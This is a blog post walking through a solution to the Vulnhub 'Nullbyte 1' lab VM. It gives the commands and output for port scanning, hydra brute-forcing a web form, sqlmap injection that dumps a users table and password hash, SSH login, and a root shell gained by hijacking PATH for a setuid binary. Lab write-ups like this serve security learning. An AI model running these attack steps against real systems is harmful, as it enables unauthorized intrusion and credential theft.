<!DOCTYPE html>
<html lang="en">

<head>
            <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="Sven Steinbauer">


        <title>Nullbyte 1 solution</title>

            <link href="/post/index.xml" type="application/atom+xml" rel="alternate" title="Unlogic Atom Feed" />
            <link href="/feed.xml" type="application/rss+xml" rel="alternate" title="Unlogic RSS Feed" />
        <!-- Bootstrap Core CSS -->
        <link href="/theme/css/bootstrap.min.css" rel="stylesheet">

        <!-- Custom CSS -->
        <link href="/theme/css/clean-blog.min.css" rel="stylesheet">

        <!-- Code highlight color scheme -->
            <link href="/theme/css/code_blocks/monokai.css" rel="stylesheet">


        <!-- Custom Fonts -->
        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->



        <meta name="description" content="I've been AFK for a while because of various reasons, but now I'm back and have managed to scrape a little time together to get on with ...">

        <meta name="author" content="Sven Steinbauer">


	                <meta property="og:locale" content="">
		<meta property="og:site_name" content="Unlogic">

	<meta property="og:type" content="article">
            <meta property="article:author" content="Sven Steinbauer" >
	<meta property="og:url" content="/2015/08/25/nullbyte-1-solution/">
	<meta property="og:title" content="Nullbyte 1 solution">
	<meta property="article:published_time" content="2015-08-25 00:00:00+01:00">
            <meta property="og:description" content="I've been AFK for a while because of various reasons, but now I'm back and have managed to scrape a little time together to get on with ...">

            <meta property="og:image" content="/images/keyboard-feature.jpg">
            <meta name="twitter:card" content="summary" />
            <meta name="twitter:image" content="images/keyboard-feature.jpg">
        <meta name="twitter:site" content="@binaryheadache" />
        <meta name="twitter:title" content="Nullbyte 1 solution" />
            <meta name="twitter:description" content="<p>I've been AFK for a while because of various reasons, but now I'm back and have
managed to scrape a little time together to get on with some of <a class="reference external" href="https://vulnhub.com">Vulnhub's</a>
new VMs.</p>
<p>So let's start with <a class="reference external" href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>
<div class="section" id="stage-1">
<h2>Stage 1</h2>
<p>I ran the usual service discovery ...</p></div>" />
            <meta name="twitter:image" content="/images/keyboard-feature.jpg">
</head>

<body>

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
        <div class="container-fluid">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="/">Unlogic</a>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav navbar-right">

                            <li><a href="/pages/about.html">About</a></li>
                            <li><a href="/pages/all-posts.html">All posts</a></li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </div>
        <!-- /.container -->
    </nav>

    <!-- Page Header -->
    <header class="intro-header" style="background-image: url('/images/keyboard-feature.jpg')">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>Nullbyte 1 solution</h1>
                        <span class="meta">Posted by
                                <a href="/author/sven-steinbauer.html">Sven Steinbauer</a>
                             on Tue 25 August 2015
                        </span>
                            <span class="meta">Updated on Tue 25 August 2015</span>
                        
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
    <!-- Post Content -->
    <article>
        <p>I've been AFK for a while because of various reasons, but now I'm back and have
managed to scrape a little time together to get on with some of <a class="reference external" href="https://vulnhub.com">Vulnhub's</a>
new VMs.</p>
<p>So let's start with <a class="reference external" href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>
<div class="section" id="stage-1">
<h2>Stage 1</h2>
<p>I ran the usual service discovery and found:</p>
<div class="highlight"><pre><span></span>root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-08-25 11:29 BST
Nmap scan report <span class="k">for</span> 192.168.56.101
Host is up <span class="o">(</span>0.00057s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
111/tcp open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
777/tcp open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></div>
<p>HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head
to the HTTP server first.</p>
<p>Upon opening the page I only get an image and some text</p>
<img alt="" src="&quot;http://i.imgur.com/SlVGKol.png&quot;" />
<p>I ran <code>dirbuster</code> on the root and got a couple of hits: <code>uploads</code> and <code>phpmyadmin</code>. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.</p>
<p>The source of the page doesn't reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.</p>
<div class="highlight"><pre><span></span>root@kali:~/Downloads# exiftool main.gif
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : <span class="m">16</span> kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
Image Size                      : 235x302
</pre></div>
<p>Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404
but that's because I didn't remove the <code>P-): `. Hitting :code:`http://192.168.56.101/kzMb5nVYJw</code>
takes me to a form asking for a key.</p>
</div>
<div class="section" id="stage-2">
<h2>Stage 2</h2>
<p>Typing in something random just shows <code>invalid key</code>. Ok, let me take a look at the source,
see where this thing goes.</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span><span class="p">&gt;</span>
Key:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;key&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="c">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;</span>
</pre></div>
<p>Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
a simple wordlist might solve this for me. Time to break out <code>hydra</code> for this:</p>
<div class="highlight"><pre><span></span>root@kali:~# hydra 192.168.56.101 http-form-post <span class="s2">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span class="m">10</span> -w 30
Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.

Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2015-08-25 11:41:58
<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">10</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">99171</span> login tries <span class="o">(</span>l:1/p:99171<span class="o">)</span>, ~154 tries per task
<span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
<span class="o">[</span>STATUS<span class="o">]</span> 18687.00 tries/min, <span class="m">18687</span> tries in 00:01h, <span class="m">80484</span> todo in 00:05h, <span class="m">10</span> active
<span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 192.168.56.101   login: x   password: elite
<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</pre></div>
<p>Bingo. Once I enter that into the field I am able to search for usernames.</p>
</div>
<div class="section" id="stage-3">
<h2>Stage 3</h2>
<p>Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
try to <code>sqlmap</code> the URL to see if there's any vulnerabilities there</p>
<div class="highlight"><pre><span></span>root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>

&lt;snip&gt;

<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> seems to be <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> ORDER BY technique seems to be usable. This should reduce the <span class="nb">time</span> needed to find the right number of query columns. Automatically extending the range <span class="k">for</span> current UNION query injection technique <span class="nb">test</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to have <span class="m">3</span> columns in query
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">&#39;usrtosearch&#39;</span> is <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
</pre></div>
<p>Result! Using this we can now dump the databasenames, tables, and data in the DB</p>
<p>(output shortened for clarity)
.. code-block:: bash</p>
<blockquote>
<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --current-db
back-end DBMS: MySQL 5.0.12
[11:13:44] [INFO] fetching current database
current database:    'seth'</p>
<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --tables -D seth
[11:13:55] [INFO] fetching tables for database: 'seth'
Database: seth
[1 table]
+-------+
| users |
+-------+</p>
<p><a class="reference external" href="mailto:root&#64;kali">root&#64;kali</a>:~# sqlmap -u <a class="reference external" href="http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses">http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses</a> --dump -D seth -T users
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+</p>
</blockquote>
<p>An MD5 hashed password? I best put that through <a class="reference external" href="http://md5decoder.org/">md5decoder</a> to
be rewarded with the password <code>omega</code></p>
</div>
<div class="section" id="stage-4">
<h2>stage 4</h2>
<p>Turns out that this is ramses's password on the ssh service that's running on
port 777 on the VM. So I'll connect to that and have a look at what's going on there.</p>
<p>Not much in his home directory, so I'll checkout what he's been up to</p>
<div class="highlight"><pre><span></span>ramses@NullByte:~$ cat .bash_history
sudo -s
su eric
<span class="nb">exit</span>
ls
clear
<span class="nb">cd</span> /var/www
<span class="nb">cd</span> backup/
ls
./procwatch
clear
sudo -s
<span class="nb">cd</span> /
ls
<span class="nb">exit</span>
</pre></div>
<p>Interesting, ramses has something in <code>/var/www</code>. Seems like a setuid root
binary called <code>procwatch</code>. After running it I would assume that it's just running <code>ps</code>
to return a list of processes. If I run <code>ps</code> on its own, I get the same output (minus
procwatch of course)</p>
<p>So let's see if it calls <code>ps</code> with an absolute path, or not. As a quick test I'll create
a symlink to <code>ls</code> in the current directory and name it <code>ps</code>. Then I set the <code>PATH</code> environment variable
with the current dir at the front.</p>
<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
ramses@NullByte:/var/www/backup$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:<span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>
ramses@NullByte:/var/www/backup$ ./procwatch
ls  procwatch  ps  readme.txt
</pre></div>
<p>Excellent, it just calls <code>ps</code> without a path. A classic issue you can often
find in programs that call other programs.</p>
<p>So let me leverage this to get myself a root shell and ultimately the flag</p>
<div class="highlight"><pre><span></span>ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup$ ./procwatch
<span class="c1"># whoami</span>
root
<span class="c1"># cat /root/proof.txt</span>
<span class="o">[</span>OUTPUT CUT<span class="o">]</span>
</pre></div>
<p>And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.</p>
</div>

    </article>


<hr>
<div class="sharing">
</div>
    <hr>

            </div>
        </div>
    </div>

    <hr>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <ul class="list-inline text-center">
                            <li>
                                <a href="https://github.com/svenito">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="https://twitter.com/binaryheadache">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                            <li>
                                <a href="/post/index.xml">
                                    <span class="fa-stack fa-lg">
                                        <i class="fa fa-circle fa-stack-2x"></i>
                                        <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                                    </span>
                                </a>
                            </li>
                    </ul>
<p class="copyright text-muted">
    Blog powered by <a href="http://getpelican.com">Pelican</a>,
    which takes great advantage of <a href="http://python.org">Python</a>.
</p>                </div>
            </div>
        </div>
    </footer>

    <!-- jQuery -->
    <script src="/theme/js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="/theme/js/bootstrap.min.js"></script>

        <!-- Custom Theme JavaScript -->
        <script src="/theme/js/clean-blog.min.js"></script>

<script type="text/javascript">
    var disqus_shortname = 'unlogic';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
</body>

</html>